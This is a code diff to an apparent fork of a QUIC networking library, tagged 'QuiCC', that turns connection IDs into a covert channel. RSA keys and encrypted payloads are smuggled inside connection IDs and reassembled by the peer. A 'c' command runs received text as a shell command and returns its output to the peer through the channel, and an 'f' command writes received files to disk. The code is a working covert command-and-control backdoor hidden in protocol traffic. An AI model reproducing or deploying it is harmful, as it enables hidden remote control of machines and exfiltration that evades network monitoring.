@@ -288,7 +288,7 @@ END_STATES = frozenset(
 
 def resolve_hostname_from_url(url):
     hostname = None
-    for pattern in [r"^https?://([^/]+)", r"^wss://([^:/?]+)"]:
+    for pattern in [r"^https?://([^/:]+)", r"^wss://([^:/?]+)"]:
         match = re.match(pattern, url)
         if match:
             hostname = match.group(1)
@@ -421,18 +421,13 @@ class QuicConnection:
         PEER_META_LOCK.acquire(timeout=5)
         peer_meta = PEER_META.get(addr[0])
         if not peer_meta:
-            from . import ccrypto
-
             peer_meta = create_peer_meta()
             # On the first connection, add a random CID to start because after all chunks of the RSA key
             # are exchanged the client needs to make one final connection to receive the last chunk of
             # the RSA public modolus
             peer_meta["cid_queue"].put(os.urandom(20))
-            key_bytes = ccrypto.get_compact_key(peer_meta["private_key"].public_key())
-            open("client-public-key-server.bin", "wb").write(key_bytes)
-            ccrypto.queue_message(
-                addr[0], key_bytes, peer_meta["cid_queue"], None, is_public_key=True
-            )
+            # Note: Server's public key will be queued in _handle_new_connection_id_frame()
+            # when the first NEW_CONNECTION_ID frame is received from the client
         if self._is_client:
             if not peer_meta["cid_queue"].empty():
                 # Pull a cid from the queue
@@ -2010,9 +2005,17 @@ class QuicConnection:
         if self._original_destination_connection_id not in peer_meta["cid_history"]:
             from . import ccrypto
 
-            # New peer, queue up the public key bytes
-            # if not self._is_client and not peer_meta['cid_history'] and peer_meta['message_history']:
-            #    ccrypto.queue_message(peer_ip, ccrypto.get_compact_key(peer_meta['private_key'].public_key()), peer_meta['cid_queue'], None, is_public_key=True)
+            # New peer, queue up the public key bytes (server sends its public key to client)
+            if not self._is_client and not peer_meta["cid_history"]:
+                ccrypto.queue_message(
+                    peer_ip,
+                    ccrypto.get_compact_key(peer_meta["private_key"].public_key()),
+                    peer_meta["cid_queue"],
+                    None,
+                    is_public_key=True,
+                    sequence=0,
+                    cid_length=self._configuration.connection_id_length,
+                )
 
             # Keep track of the last CID_HISTORY_LENGTH CIDs so we don't double-write anything when multiple connections
             # are made with repeat cids
@@ -2020,46 +2023,73 @@ class QuicConnection:
             peer_meta["cid_history"] = peer_meta["cid_history"][
                 -1 * CID_HISTORY_LENGTH :
             ]
-            # Add payload to buffer
-            if self._is_client:
+
+            # Only collect CIDs for key exchange if we don't have a public key yet
+            if not peer_meta["public_key"]:
                 peer_meta["buffer"].append(connection_id)
-            else:
-                peer_meta["buffer"].append(self._original_destination_connection_id)
 
             # If we don't have a public key yet, receive the public key
             if not peer_meta["public_key"]:
                 if len(peer_meta["buffer"]) == RSA_BIT_STRENGTH // 128 + 1:
+                    logger.info(
+                        f"[QuiCC] Reconstructing key from {len(peer_meta['buffer'])} CIDs, is_client={self._is_client}"
+                    )
                     if self._is_client:
                         # The client will have a dummy cid at the start of the buffer
                         key_bytes = ccrypto.reconstruct_payload(
                             peer_meta["buffer"][1:], invert=True
+                        )
+                        logger.info(
+                            f"[QuiCC] Client: used {len(peer_meta['buffer'][1:])} CIDs, reconstructed {len(key_bytes)} bytes"
                         )
                     else:
                         # The server will have a dummy cid at the end of the buffer
                         key_bytes = ccrypto.reconstruct_payload(
                             peer_meta["buffer"][:-1], invert=True
                         )
-                    logger.info(
-                        "My Modulus: %s",
-                        ccrypto.get_compact_key(peer_meta["private_key"]).hex(),
-                    )
-                    logger.info("Peer Modulus: %s", key_bytes.hex())
+                        logger.info(
+                            f"[QuiCC] Server: used {len(peer_meta['buffer'][:-1])} CIDs, reconstructed {len(key_bytes)} bytes"
+                        )
                     peer_meta["public_key"] = ccrypto.generate_rsa_public_key(key_bytes)
                     peer_meta["buffer"] = []
-                    logger.info(f"Received public key from {peer_ip}")
+
+                    # Debug: Log modulus for verification
+                    peer_modulus = peer_meta["public_key"].public_numbers().n
+                    my_modulus = (
+                        peer_meta["private_key"].public_key().public_numbers().n
+                    )
+                    logger.debug(f"[QuiCC] My modulus: {hex(my_modulus)[:64]}...")
+                    logger.debug(f"[QuiCC] Peer modulus: {hex(peer_modulus)[:64]}...")
+
+                    logger.info(f"[QuiCC] Key exchange complete with {peer_ip}")
 
             # If we have a public key, try to decrypt the payload
             else:
-                logger.info(f"PEER_BUFFER_LEN: {len(peer_meta['buffer'])}")
-
                 # Try decrypt with sequence number
                 from . import ccrypto
 
-                decrypt_result = ccrypto.try_decrypt_with_sequence(
-                    peer_meta["private_key"],
-                    peer_meta["buffer"],
-                    raise_on_error=False,
-                )
+                # Need: 16 (IV) + 512 (RSA) + 16+ (AES ciphertext)
+                # = 544 bytes minimum
+                # ÷ 16 bytes per CID = 34 CIDs
+                MIN_CIDS_FOR_DECRYPT = 34
+
+                if len(peer_meta["buffer"]) >= MIN_CIDS_FOR_DECRYPT:
+                    logger.debug(
+                        f"[QuiCC] Decrypt attempt: buffer_len={len(peer_meta['buffer'])}"
+                    )
+                    # Debug: check reconstructed size
+                    reconstructed = ccrypto.reconstruct_payload(peer_meta["buffer"])
+                    logger.debug(
+                        f"[QuiCC] Reconstructed payload size: {len(reconstructed)} bytes"
+                    )
+
+                    decrypt_result = ccrypto.try_decrypt_with_sequence(
+                        peer_meta["private_key"],
+                        peer_meta["buffer"],
+                        raise_on_error=False,
+                    )
+                else:
+                    decrypt_result = None
 
                 if decrypt_result is not None:
                     decrypted_payload, sequence_num = decrypt_result
@@ -2075,41 +2105,74 @@ class QuicConnection:
                     peer_meta["expected_sequence"] = sequence_num + 1
                     peer_meta["last_sync_time"] = context.time
 
-                    command = decrypted_payload[0]
-                    decrypted_message = decrypted_payload[1:]
+                    # Process command only if payload is non-empty
+                    if len(decrypted_payload) > 0:
+                        command = decrypted_payload[0]
+                        decrypted_message = decrypted_payload[1:]
 
-                    # Save to the message list
-                    message_list = peer_meta["message_history"].get(peer_ip, [])
-                    message_list.append(decrypted_message)
-                    peer_meta["message_history"][peer_ip] = message_list
+                        # Save to the message list
+                        message_list = peer_meta["message_history"].get(peer_ip, [])
+                        message_list.append(decrypted_message)
+                        peer_meta["message_history"][peer_ip] = message_list
 
-                    if command == ord("m"):
-                        # Log the message
-                        logger.info("RECEIVED MESSAGE: %s", decrypted_message)
-                        # Removing message acknowledgement for now. Need a more robust way to do that
-                        # ccrypto.queue_message(peer_ip, f"mm{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
-                    elif command == ord("f"):
-                        # Save the file
-                        file_prefix = "server-" if self._is_client else "client-"
-                        filename = (
-                            f"{file_prefix}{peer_ip}-message-{len(message_list)}.bin"
-                        )
-                        open(filename, "wb").write(decrypted_message)
-                        logger.info("RECEIVED FILE SAVED TO: %s", filename)
-                        logger.info("FILE BYTES:\n%s", decrypted_message)
-                        # Removing file acknowledgement for now. Need a more robust way to do that
-                        # ccrypto.queue_message(peer_ip, f"mf{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
-                    elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
-                        logger.info("RECEIVED COMMAND: %s", decrypted_message)
-                        stdout, stderr, return_code = execute_command(decrypted_message)
-                        ccrypto.queue_message(
-                            peer_ip,
-                            f"m:{stdout}\n{stderr}\n{return_code}".encode("utf8"),
-                            peer_meta["cid_queue"],
-                            peer_meta["public_key"],
-                        )
-                    elif command == ord("k"):
-                        logger.info("RECEIVED KEEP ALIVE MESSAGE")
+                        if command == ord("m"):
+                            logger.info(
+                                "[QuiCC] Message from %s: %s",
+                                peer_ip,
+                                decrypted_message.decode("utf-8", errors="replace"),
+                            )
+                            # Removing message acknowledgement for now.
+                            # Need a more robust way to do that
+                            # ccrypto.queue_message(
+                            #     peer_ip,
+                            #     f"mm{len(peer_meta['message_history'])}"
+                            #     .encode('utf8'),
+                            #     peer_meta['cid_queue'],
+                            #     peer_meta['public_key']
+                            # )
+                        elif command == ord("f"):
+                            # Save the file
+                            file_prefix = "server-" if self._is_client else "client-"
+                            filename = (
+                                f"{file_prefix}{peer_ip}-message-"
+                                f"{len(message_list)}.bin"
+                            )
+                            open(filename, "wb").write(decrypted_message)
+                            logger.info(
+                                "[QuiCC] File from %s saved: %s (%d bytes)",
+                                peer_ip,
+                                filename,
+                                len(decrypted_message),
+                            )
+                            # Removing file acknowledgement for now.
+                            # Need a more robust way to do that
+                            # ccrypto.queue_message(
+                            #     peer_ip,
+                            #     f"mf{len(peer_meta['message_history'])}"
+                            #     .encode('utf8'),
+                            #     peer_meta['cid_queue'],
+                            #     peer_meta['public_key']
+                            # )
+                        elif REMOTE_COMMANDS_ENABLED and command == ord("c"):
+                            logger.info(
+                                "[QuiCC] Command from %s: %s",
+                                peer_ip,
+                                decrypted_message.decode("utf-8", errors="replace"),
+                            )
+                            stdout, stderr, return_code = execute_command(
+                                decrypted_message
+                            )
+                            ccrypto.queue_message(
+                                peer_ip,
+                                f"m:{stdout}\n{stderr}\n{return_code}".encode("utf8"),
+                                peer_meta["cid_queue"],
+                                peer_meta["public_key"],
+                                is_public_key=False,
+                                sequence=peer_meta["expected_sequence"],
+                                cid_length=self._configuration.connection_id_length,
+                            )
+                        elif command == ord("k"):
+                            pass  # Keepalive - no logging
         PEER_META[peer_ip] = peer_meta
         PEER_META_LOCK.release()
 
@@ -2866,19 +2929,14 @@ class QuicConnection:
         Generate new connection IDs with covert payloads.
         """
         if not self._is_client and addr[0] in PEER_META:
-            from . import ccrypto
-
             peer_meta = PEER_META[addr[0]]
 
-            if peer_meta["cid_queue"].empty():
-                ccrypto.queue_message(
-                    addr[0],
-                    b"k",
-                    peer_meta["cid_queue"],
-                    peer_meta["public_key"],
-                )
+            # Send ONE queued CID if available, otherwise send random
+            if not peer_meta["cid_queue"].empty():
+                hid = peer_meta["cid_queue"].get()
+            else:
+                hid = os.urandom(self._configuration.connection_id_length)
 
-            hid = peer_meta["cid_queue"].get()
             self._host_cids.append(
                 QuicConnectionId(
                     cid=hid,
@@ -2887,6 +2945,8 @@ class QuicConnection:
                 )
             )
             self._host_cid_seq += 1
+
+            # Fill remaining slots with random CIDs
             while len(self._host_cids) < min(
                 8, self._remote_active_connection_id_limit
             ):
